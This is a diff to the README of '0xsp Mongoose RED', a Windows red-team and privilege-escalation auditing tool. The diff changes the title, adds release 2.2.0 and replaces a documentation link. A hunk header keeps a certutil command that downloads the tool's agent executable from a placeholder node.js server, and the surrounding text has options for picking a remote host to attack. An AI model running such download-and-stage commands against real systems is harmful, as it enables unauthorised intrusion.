@@ -5,7 +5,8 @@
 [<img src="https://img.shields.io/badge/join-discord-orange">](https://discord.gg/Xsdxxkm)
 [<img src="https://img.shields.io/twitter/follow/zux0x3a?label=follow&style=social">](https://twitter.com/zux0x3a)
 
-# 0xsp Mongoose Red for Windows 
+# 0xsp Mongoose RED for Windows 
+Current Release **2.2.0** 
 
 0xsp mongoose red version is provided to assist your needs during cyber security simulation, by using this version you will be able to audit a targeted windows operation system 
 for system vulnerabilities, misconfigurations and privilege escalation attacks and replicate the tactics and techniques of an advanced adversary in a network.
@@ -99,8 +100,8 @@ certutil.exe -urlcache -split -f "http://nodejsip:4000/release/x64.exe" agent.ex
 -host --identify remote host to conduct an attack to.
 -srvhost --set rhost of node js application.(bidirectional communications).
 ```
-### quick wiki 
-https://github.com/lawrenceamer/0xsp-Mongoose/wiki/0xsp-mongoose-red-version-2.1
+### Documentations
+https://0xsp.com/security%20dev/0xsp-mongoose-red
 
 ### detailed research site 
 https://0xsp.com 
